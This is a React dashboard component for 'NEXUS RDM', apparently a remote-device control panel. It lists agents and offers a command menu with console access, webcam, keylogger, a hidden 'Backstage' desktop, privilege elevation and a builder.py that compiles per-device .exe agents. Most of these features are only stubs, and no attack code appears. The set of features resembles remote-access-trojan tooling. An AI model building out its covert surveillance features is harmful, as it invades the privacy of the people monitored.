import { useEffect, useState, useCallback, useRef } from "react";
import { createPortal } from "react-dom";
import { useNavigate } from "react-router-dom";
import { useAuthStore } from "../store/auth";
import api from "../utils/api";
import s from "./Dashboard.module.css";

const CATEGORIES = {
  "Remote Access": {
    icon: "⚡",
    items: [
      { label: "Console",        icon: "⌨",  danger: false, impl: true  },
      { label: "Remote Desktop", icon: "🖥",  danger: false, impl: false },
      { label: "Backstage",      icon: "🎭",  danger: false, impl: false },
      { label: "Voice",          icon: "🎙",  danger: false, impl: false },
    ],
  },
  "Monitoring": {
    icon: "👁",
    items: [
      { label: "Webcam",          icon: "📷", danger: false, impl: false },
      { label: "Keylogger",       icon: "⌨",  danger: false, impl: false },
      { label: "Process Manager", icon: "📊", danger: false, impl: false },
    ],
  },
  "System": {
    icon: "⚙",
    items: [
      { label: "File Manager",    icon: "📁", danger: false, impl: false },
      { label: "Registry Editor", icon: "🔧", danger: false, impl: false },
      { label: "Task Killer",     icon: "💀", danger: false, impl: false },
      { label: "Clipboard",       icon: "📋", danger: false, impl: false },
    ],
  },
  "Agent": {
    icon: "🤖",
    items: [
      { label: "Ping",               icon: "📡", danger: false, impl: true  },
      { label: "Reconnect",          icon: "🔄", danger: false, impl: true  },
      { label: "Set Nickname",       icon: "✏",  danger: false, impl: false },
      { label: "Set Custom Tag",     icon: "🏷",  danger: false, impl: false },
      { label: "Set Group",          icon: "👥", danger: false, impl: false },
      { label: "Mute Notifications", icon: "🔕", danger: false, impl: false },
      { label: "Elevate",            icon: "⬆",  danger: false, impl: false },
      { label: "Disconnect",         icon: "🔌", danger: true,  impl: false },
      { label: "Uninstall",          icon: "🗑",  danger: true,  impl: false },
    ],
  },
};

// ─── Sidebar pages ────────────────────────────────────────────────────────────
const PAGES = ["DEVICES", "AUDIT LOG", "SETTINGS"];

export default function Dashboard() {
  const navigate = useNavigate();
  const { user, logout, refreshToken } = useAuthStore();
  const [page,    setPage]    = useState("DEVICES");
  const [devices, setDevices] = useState([]);
  const [stats,   setStats]   = useState(null);
  const [loading, setLoading] = useState(true);
  const [showAdd, setShowAdd] = useState(false);
  const [newKey,  setNewKey]  = useState(null);
  const [filter,  setFilter]  = useState("all");
  const [search,  setSearch]  = useState("");
  const [auditLogs, setAuditLogs] = useState([]);

  const load = useCallback(async () => {
    try {
      const [sr, dr] = await Promise.all([
        api.get("/api/devices/stats"),
        api.get("/api/devices"),
      ]);
      setStats(sr.data);
      setDevices(dr.data.devices);
    } catch (e) { console.error(e); }
    finally { setLoading(false); }
  }, []);

  const loadAuditLogs = useCallback(async () => {
    try {
      // fetch recent audit logs across all devices
      const dr = await api.get("/api/devices");
      const devices = dr.data.devices;
      const logs = await Promise.all(
        devices.map(d => api.get(`/api/devices/audit/${d.id}`).then(r => r.data.logs).catch(() => []))
      );
      const all = logs.flat().sort((a,b) => b.created_at.localeCompare(a.created_at));
      setAuditLogs(all.slice(0, 200));
    } catch (e) { console.error(e); }
  }, []);

  const refreshDevice = useCallback(async (id) => {
    try {
      const [{ data }, { data: st }] = await Promise.all([
        api.get(`/api/devices/${id}`),
        api.get("/api/devices/stats"),
      ]);
      setDevices(prev => prev.map(d => d.id === id ? data.device : d));
      setStats(st);
    } catch (e) { console.error(e); }
  }, []);

  useEffect(() => { load(); }, [load]);
  useEffect(() => {
    const t = setInterval(load, 30_000);
    return () => clearInterval(t);
  }, [load]);

  useEffect(() => {
    if (page === "AUDIT LOG") loadAuditLogs();
  }, [page, loadAuditLogs]);

  const handleLogout = async () => {
    try { await api.post("/api/auth/logout", { refreshToken }); } catch {}
    logout(); navigate("/login");
  };

  const handleDelete = async (id) => {
    if (!confirm("Delete this device? This cannot be undone.")) return;
    await api.delete(`/api/devices/${id}`);
    load();
  };

  const filtered = devices.filter(d => {
    const matchStatus = filter === "all" || d.status === filter;
    const q = search.toLowerCase();
    const matchSearch = !q ||
      d.name?.toLowerCase().includes(q) ||
      d.hostname?.toLowerCase().includes(q) ||
      d.ip_address?.includes(q) ||
      d.username?.toLowerCase().includes(q);
    return matchStatus && matchSearch;
  });

  if (loading) return <Loader />;

  return (
    <div className={s.layout}>
      {/* ── Sidebar ── */}
      <aside className={s.sidebar}>
        <div className={s.sidebarTop}>
          <div className={s.brand}>
            <span className={s.brandMark}>N</span>
            <div className={s.brandName}>NEXUS<span style={{ color:"var(--accent)" }}>RDM</span></div>
          </div>
          <nav className={s.nav}>
            {PAGES.map(p => (
              <div
                key={p}
                className={`${s.navItem} ${page === p ? s.navActive : ""}`}
                onClick={() => setPage(p)}
              >
                <span className={s.navIcon}>
                  {p === "DEVICES" ? "⬡" : p === "AUDIT LOG" ? "◎" : "◇"}
                </span>
                <span>{p}</span>
              </div>
            ))}
          </nav>
        </div>
        <div className={s.sidebarBottom}>
          <div className={s.userRow}>
            <div className={s.avatar}>{(user?.name?.[0] ?? "U").toUpperCase()}</div>
            <div className={s.userInfo}>
              <div className={s.userName}>{user?.name}</div>
              <div className={s.userRole}>{user?.role?.toUpperCase()}</div>
            </div>
          </div>
          <button className={s.logoutBtn} onClick={handleLogout} title="Sign out">⏻</button>
        </div>
      </aside>

      {/* ── Main content ── */}
      <main className={s.main}>
        {page === "DEVICES" && (
          <>
            <div className={s.header}>
              <div>
                <h1 className={s.pageTitle}>DEVICES</h1>
                <div className={s.pageSub}>// {devices.length} registered · auto-refresh 30s</div>
              </div>
              <button className="btn-primary" onClick={() => setShowAdd(true)}>+ REGISTER</button>
            </div>

            {stats && (
              <div className={s.statsRow}>
                {[
                  { label:"TOTAL",   value:stats.total,   color:"accent", key:"all"     },
                  { label:"ONLINE",  value:stats.online,  color:"online", key:"online"  },
                  { label:"OFFLINE", value:stats.offline, color:"dim",    key:"offline" },
                  { label:"WARNING", value:stats.warning, color:"warn",   key:"warning" },
                ].map(({ label, value, color, key }) => (
                  <div key={key}
                    className={`${s.stat} ${filter===key ? s.statActive : ""}`}
                    onClick={() => setFilter(key)}
                  >
                    <div className={s.statVal} style={{ color:statColor(color) }}>{value ?? 0}</div>
                    <div className={s.statLabel}>{label}</div>
                  </div>
                ))}
              </div>
            )}

            <input className={s.search} placeholder="Search name, hostname, IP, user…"
              value={search} onChange={e => setSearch(e.target.value)} />

            {newKey && (
              <div className={s.keyBanner}>
                <div className={s.keyBannerTitle}>⚠ DEVICE KEY — COPY NOW. NEVER SHOWN AGAIN.</div>
                <div className={s.keyValue}>{newKey}</div>
                <div className={s.keyActions}>
                  <button className={s.keyCopy} onClick={() => {
                    navigator.clipboard?.writeText(newKey);
                  }}>
                    📋 COPY TO CLIPBOARD
                  </button>
                  <button className={s.keyClose} onClick={() => setNewKey(null)}>DISMISS</button>
                </div>
              </div>
            )}

            {filtered.length === 0 ? (
              <EmptyState onAdd={() => setShowAdd(true)} hasFilter={filter !== "all" || !!search} />
            ) : (
              <div className={s.deviceGrid}>
                {filtered.map(d => (
                  <DeviceCard key={d.id} device={d}
                    onDelete={() => handleDelete(d.id)}
                    onRefresh={() => refreshDevice(d.id)} />
                ))}
              </div>
            )}
          </>
        )}

        {page === "AUDIT LOG" && (
          <AuditLogPage logs={auditLogs} onRefresh={loadAuditLogs} />
        )}

        {page === "SETTINGS" && (
          <SettingsPage user={user} />
        )}
      </main>

      {showAdd && (
        <AddDeviceModal
          onClose={() => setShowAdd(false)}
          onCreated={key => { setNewKey(key); setShowAdd(false); load(); }}
        />
      )}
    </div>
  );
}

// ─── Device Card ──────────────────────────────────────────────────────────────
function DeviceCard({ device: d, onDelete, onRefresh }) {
  const [menuOpen,   setMenuOpen]  = useState(false);
  const [activeCat,  setActiveCat] = useState(null);
  const [refreshing, setRefreshing]= useState(false);
  const [pingResult, setPingResult]= useState(null);
  const [menuPos,    setMenuPos]   = useState({ top:0, left:0 });
  const btnRef  = useRef(null);
  const menuRef = useRef(null);

  const statusColor = {
    online: "var(--online)", offline: "var(--offline)", warning: "var(--warning)",
  }[d.status] ?? "var(--offline)";

  const ramPct  = d.ram_total  ? Math.round((d.ram_used  / d.ram_total)  * 100) : null;
  const diskPct = d.disk_total ? Math.round((d.disk_used / d.disk_total) * 100) : null;
  const age = d.last_seen ? timeAgo(new Date(d.last_seen)) : "never";

  useEffect(() => {
    if (!menuOpen) return;
    const h = e => {
      if (menuRef.current && !menuRef.current.contains(e.target) &&
          btnRef.current  && !btnRef.current.contains(e.target)) {
        setMenuOpen(false); setActiveCat(null);
      }
    };
    document.addEventListener("mousedown", h);
    return () => document.removeEventListener("mousedown", h);
  }, [menuOpen]);

  const openMenu = () => {
    if (menuOpen) { setMenuOpen(false); setActiveCat(null); return; }
    const rect = btnRef.current.getBoundingClientRect();
    setMenuPos({ top: rect.top - 8, left: rect.left });
    setMenuOpen(true); setActiveCat(null);
  };

  const handleRefresh = async () => {
    setRefreshing(true);
    await onRefresh();
    setRefreshing(false);
  };

  // ── Command handler ──────────────────────────────────────────
  const handleItem = async (cat, item) => {
    setMenuOpen(false); setActiveCat(null);

    if (!item.impl) {
      alert(`${item.label} — coming soon`);
      return;
    }

    if (item.danger && !confirm(`${item.label} on ${d.hostname || d.name}?`)) return;

    if (cat === "Remote Access" && item.label === "Console") {
      // Get a fresh WS token to avoid 401 in new tab
      try {
        const { data } = await api.get("/api/auth/ws-token");
        const params = new URLSearchParams({
          deviceId: d.id,
          token:    data.token,
          name:     d.name,
          host:     d.hostname || d.name,
          user:     d.username || "",
          os:       d.os_version
            ? `${d.os || "Windows"} ${d.os_version}`
            : d.os || "Windows",
        });
        window.open(`/terminal?${params}`, `terminal_${d.id}`);
      } catch {
        alert("Could not get terminal token — try again");
      }
      return;
    }

    if (cat === "Agent" && item.label === "Ping") {
      const start = Date.now();
      try {
        await api.post(`/api/devices/ping`, { deviceId: d.id });
        setPingResult(`${Date.now() - start}ms`);
        setTimeout(() => setPingResult(null), 3000);
      } catch { setPingResult("timeout"); setTimeout(() => setPingResult(null), 3000); }
      return;
    }

    if (cat === "Agent" && item.label === "Reconnect") {
      await onRefresh();
      return;
    }
  };

  return (
    <div className={s.card}>
      {/* Status */}
      <div className={s.cardTop}>
        <span className={s.statusDot} style={{
          background: statusColor,
          boxShadow: d.status === "online" ? `0 0 7px ${statusColor}` : "none",
        }} />
        <span className={s.cardStatus} style={{ color: statusColor }}>
          {d.status === "online" ? "Online" : d.status === "warning" ? "Warning" : "Offline"}
        </span>
        <span className={s.cardAge}>· {age}</span>
        {pingResult && <span className={s.ping}>📡 {pingResult}</span>}
        {!pingResult && d.ping_ms != null && d.status === "online" &&
          <span className={s.ping}>⟳ {d.ping_ms}ms</span>}
      </div>

      {/* Name */}
      <div className={s.cardName}>
        <span className={s.cardNameIcon}>≡</span>
        {d.hostname || d.name}
      </div>

      {/* Meta */}
      {d.username   && <div className={s.cardMeta}><span className={s.metaIco}>👤</span>{d.username}</div>}
      {d.ip_address && <div className={s.cardMeta}><span className={s.metaIco}>🌐</span>{d.ip_address}</div>}

      {/* Badges */}
      <div className={s.cardBadges}>
        {d.os && <span className={s.badge}>🪟 {d.os}{d.os_version ? ` ${d.os_version}` : ""}</span>}
        {d.arch      && <span className={s.badge}>{d.arch}</span>}
        {d.cpu_cores && <span className={s.badge}>🖥 {d.cpu_cores}</span>}
        {d.agent_version && <span className={`${s.badge} ${s.badgeGreen}`}>v{d.agent_version}</span>}
      </div>

      {/* CPU */}
      {d.cpu_model && <div className={s.cpuModel}>{d.cpu_model}</div>}

      {/* Metrics — icon + value rows, no slidebars */}
      <div className={s.metrics}>
        {d.ram_total != null && (
          <div className={s.metricRow}>
            <span className={s.metricIcon}>💾</span>
            <span className={s.metricLabel}>{formatBytes(d.ram_total)}</span>
            <div className={s.metricBar}>
              <div className={s.metricFill}
                style={{ width:`${ramPct??0}%`, background: ramPct>85?"var(--danger)":"var(--accent)" }} />
            </div>
            <span className={s.metricVal}>{ramPct!=null?`${ramPct}%`:"—"}</span>
          </div>
        )}
        {d.disk_total != null && (
          <div className={s.metricRow}>
            <span className={s.metricIcon}>💿</span>
            <span className={s.metricLabel}>DISK</span>
            <div className={s.metricBar}>
              <div className={s.metricFill}
                style={{ width:`${diskPct??0}%`, background: diskPct>90?"var(--danger)":"var(--warning)" }} />
            </div>
            <span className={s.metricVal}>{diskPct!=null?`${diskPct}%`:"—"}</span>
          </div>
        )}
        {d.battery_percent != null && (
          <div className={s.metricRow}>
            <span className={s.metricIcon}>{d.battery_charging ? "⚡" : "🔋"}</span>
            <span className={s.metricLabel}>BAT</span>
            <div className={s.metricBar}>
              <div className={s.metricFill} style={{
                width: `${d.battery_percent}%`,
                background: d.battery_charging?"var(--online)":d.battery_percent<20?"var(--danger)":"var(--warning)"
              }} />
            </div>
            <span className={s.metricVal}>{d.battery_percent}%{d.battery_charging?" ⚡":""}</span>
          </div>
        )}
      </div>

      {/* Footer */}
      <div className={s.cardFooter}>
        <button ref={btnRef} className={s.cmdBtn} onClick={openMenu}>
          <span>&gt;_</span> Commands
        </button>
        <button className={s.iconBtn} onClick={handleRefresh} title="Refresh"
          style={{ opacity: refreshing ? 0.5 : 1 }}>
          <span style={{ display:"inline-block", animation: refreshing?"spin 0.6s linear infinite":"none" }}>↺</span>
        </button>
        <button className={s.iconBtnDanger} onClick={onDelete} title="Delete">⊗</button>
      </div>

      {/* Portal dropdown */}
      {menuOpen && createPortal(
        <div ref={menuRef} className={s.portalMenu} style={{ top:menuPos.top, left:menuPos.left }}>
          <div className={s.dropPanel}>
            {Object.entries(CATEGORIES).map(([cat, { icon }]) => (
              <div key={cat}
                className={`${s.dropItem} ${activeCat===cat ? s.dropItemActive : ""}`}
                onMouseEnter={() => setActiveCat(cat)}>
                <span className={s.dropIcon}>{icon}</span>
                {cat}
                <span className={s.dropArrow}>›</span>
              </div>
            ))}
          </div>
          {activeCat && (
            <div className={s.dropPanel}>
              {CATEGORIES[activeCat].items.map(item => (
                <div key={item.label}
                  className={`${s.dropItem} ${item.danger?s.dropItemDanger:""} ${!item.impl?s.dropItemDim:""}`}
                  onClick={() => handleItem(activeCat, item)}>
                  <span className={s.dropIcon}>{item.icon}</span>
                  {item.label}
                  {!item.impl && <span className={s.dropSoon}>soon</span>}
                </div>
              ))}
            </div>
          )}
        </div>,
        document.body
      )}
    </div>
  );
}

// ─── Audit Log Page ───────────────────────────────────────────────────────────
function AuditLogPage({ logs, onRefresh }) {
  return (
    <div>
      <div className={s.header}>
        <div>
          <h1 className={s.pageTitle}>AUDIT LOG</h1>
          <div className={s.pageSub}>// {logs.length} entries</div>
        </div>
        <button className="btn-ghost" onClick={onRefresh}>↺ Refresh</button>
      </div>
      <div className={s.auditTable}>
        <div className={s.auditHead}>
          <span>TIME</span><span>ACTION</span><span>IP</span>
        </div>
        {logs.length === 0 && (
          <div className={s.auditEmpty}>No audit entries yet</div>
        )}
        {logs.map((l, i) => (
          <div key={i} className={s.auditRow}>
            <span className={s.auditTime}>{new Date(l.created_at).toLocaleString()}</span>
            <span className={s.auditAction}>{l.action}</span>
            <span className={s.auditIp}>{l.ip_address || "—"}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── Settings Page ────────────────────────────────────────────────────────────
function SettingsPage({ user }) {
  return (
    <div>
      <div className={s.header}>
        <div>
          <h1 className={s.pageTitle}>SETTINGS</h1>
          <div className={s.pageSub}>// Account & security</div>
        </div>
      </div>
      <div className={s.settingsGrid}>
        <div className={s.settingsCard}>
          <div className={s.settingsTitle}>ACCOUNT</div>
          <div className={s.settingsRow}><span>Name</span><span>{user?.name}</span></div>
          <div className={s.settingsRow}><span>Email</span><span>{user?.email}</span></div>
          <div className={s.settingsRow}><span>Role</span><span>{user?.role}</span></div>
        </div>
        <div className={s.settingsCard}>
          <div className={s.settingsTitle}>SECURITY</div>
          <div className={s.settingsRow}>
            <span>Two-Factor Auth</span>
            <span style={{ color: user?.totp_enabled ? "var(--online)" : "var(--text-3)" }}>
              {user?.totp_enabled ? "Enabled" : "Disabled"}
            </span>
          </div>
          <div className={s.settingsNote}>
            To enable 2FA, use the API: <code>GET /api/auth/2fa/setup</code>
          </div>
        </div>
        <div className={s.settingsCard}>
          <div className={s.settingsTitle}>AGENT</div>
          <div className={s.settingsNote}>
            Run <code>builder.py</code> in the agent/ folder to compile a new .exe for any device.
            Each build bakes in the server URL, device key, and settings.
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Add Device Modal ─────────────────────────────────────────────────────────
function AddDeviceModal({ onClose, onCreated }) {
  const [name,setName] = useState("");
  const [tags,setTags] = useState("");
  const [interval,setInterval] = useState("30");
  const [error,setError] = useState("");
  const [loading,setLoading] = useState(false);

  const submit = async () => {
    if (!name.trim()) return setError("Device name required");
    const iv = parseInt(interval,10);
    if (isNaN(iv)||iv<10||iv>300) return setError("Interval must be 10–300 seconds");
    setLoading(true); setError("");
    try {
      const { data } = await api.post("/api/devices",{
        name:name.trim(),
        tags:tags.split(",").map(t=>t.trim()).filter(Boolean),
        heartbeat_interval:iv,
      });
      onCreated(data.apiKey);
    } catch(e) {
      setError(e.response?.data?.error ?? "Failed to create device");
    } finally { setLoading(false); }
  };

  return (
    <div className={s.overlay} onClick={onClose}>
      <div className={s.modal} onClick={e=>e.stopPropagation()}>
        <div className={s.modalHeader}>
          <span className={s.modalTitle}>// REGISTER DEVICE</span>
          <button className={s.modalClose} onClick={onClose}>✕</button>
        </div>
        <div className={s.modalBody}>
          <ModalField label="DEVICE NAME" value={name} onChange={setName} placeholder="office-pc-01"/>
          <ModalField label="TAGS (comma separated)" value={tags} onChange={setTags} placeholder="windows, production"/>
          <div>
            <label className={s.modalLabel}>HEARTBEAT INTERVAL (10–300 seconds)</label>
            <input type="number" min={10} max={300} value={interval} onChange={e=>setInterval(e.target.value)}/>
          </div>
          {error && <div className={s.modalError}>{error}</div>}
          <div className={s.modalNote}>API key shown once after creation. Use it in builder.py.</div>
        </div>
        <div className={s.modalFooter}>
          <button className="btn-ghost" onClick={onClose}>CANCEL</button>
          <button className="btn-primary" onClick={submit} disabled={loading}>
            {loading?"CREATING…":"CREATE →"}
          </button>
        </div>
      </div>
    </div>
  );
}

function NavItem({ icon, label, active }) {
  return (
    <div className={`${s.navItem} ${active?s.navActive:""}`}>
      <span className={s.navIcon}>{icon}</span><span>{label}</span>
    </div>
  );
}

function ModalField({ label, value, onChange, placeholder }) {
  return (
    <div>
      <label className={s.modalLabel}>{label}</label>
      <input type="text" value={value} onChange={e=>onChange(e.target.value)} placeholder={placeholder}/>
    </div>
  );
}

function EmptyState({ onAdd, hasFilter }) {
  return (
    <div className={s.empty}>
      <div className={s.emptyGlyph}>⬡</div>
      <div className={s.emptyTitle}>{hasFilter?"NO MATCHES":"NO DEVICES YET"}</div>
      <div className={s.emptySub}>{hasFilter?"Try a different filter or search":"Register a device then run builder.py"}</div>
      {!hasFilter && <button className="btn-primary" style={{marginTop:"1.25rem",width:"auto"}} onClick={onAdd}>+ REGISTER FIRST DEVICE</button>}
    </div>
  );
}

function Loader() {
  return (
    <div style={{height:"100vh",display:"flex",alignItems:"center",justifyContent:"center",flexDirection:"column",gap:16}}>
      <div style={{width:32,height:32,border:"2px solid var(--border-hi)",borderTopColor:"var(--accent)",borderRadius:"50%",animation:"spin 0.7s linear infinite"}}/>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      <span style={{fontFamily:"var(--font-mono)",fontSize:12,color:"var(--text-3)",letterSpacing:"0.1em"}}>LOADING…</span>
    </div>
  );
}

function statColor(c) {
  return {accent:"var(--accent)",online:"var(--online)",dim:"var(--text-3)",warn:"var(--warning)"}[c];
}
function formatBytes(b) {
  if (!b) return "—";
  const gb = b/1024/1024/1024;
  return gb>=1?`${gb.toFixed(0)} GB`:`${(b/1024/1024).toFixed(0)} MB`;
}
function timeAgo(d) {
  const s = Math.floor((Date.now()-d)/1000);
  if (s<60) return `${s}s ago`;
  if (s<3600) return `${Math.floor(s/60)}m ago`;
  if (s<86400) return `${Math.floor(s/3600)}h ago`;
  return `${Math.floor(s/86400)}d ago`;
}
